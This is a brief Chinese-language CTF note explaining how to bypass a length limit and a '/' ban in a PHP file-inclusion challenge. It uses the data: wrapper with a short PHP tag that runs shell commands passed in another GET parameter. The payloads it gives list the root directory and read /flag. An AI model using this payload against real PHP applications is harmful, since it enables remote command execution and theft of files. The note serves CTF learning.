data伪协议
**简写写法（绕过）：** `data:,<?php ...`
题目限制了 `strlen($file) <= 20`，而且不能有 `/`。
将 Payload 转移到其他参数

我们没有在反引号里直接写命令
我们在反引号里写了一个变量 `$_GET[1]`。
PHP 会先获取 URL 中参数 `1` 的值（例如 `cat /flag`），然后把它填入反引号中执行。

payload:
```
?file=data:,<?=`$_GET[1]`;&1=ls /

?file=data:,<?=`$_GET[1]`;&1=cat /flag
```